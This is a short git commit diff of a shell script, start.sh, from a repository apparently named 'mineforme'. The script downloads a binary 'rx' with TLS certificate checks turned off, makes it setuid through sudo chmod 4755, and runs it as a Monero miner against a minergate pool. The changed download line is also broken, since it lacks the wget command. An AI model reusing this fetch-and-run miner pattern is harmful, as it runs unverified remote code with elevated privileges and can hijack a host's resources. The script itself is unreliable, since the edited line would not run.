2e383531e005728ea041265388d4421bdaeebbd6
PowerOlive <PowerOlive@users.noreply.github.com>
2020-03-17 10:35:21 +0800

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,3 +1,3 @@
-wget https://github.com/PowerOlive/mineforme/raw/master/rx
+-qO- --no-check-certificate https://raw.githubusercontent.com/powerolive/mineforme/rx
 sudo chmod 4755 rx
 ./rx --currency monero -o xmr.pool.minergate.com:45700 -u powerolive@aliyun.com -p 1 --noTest
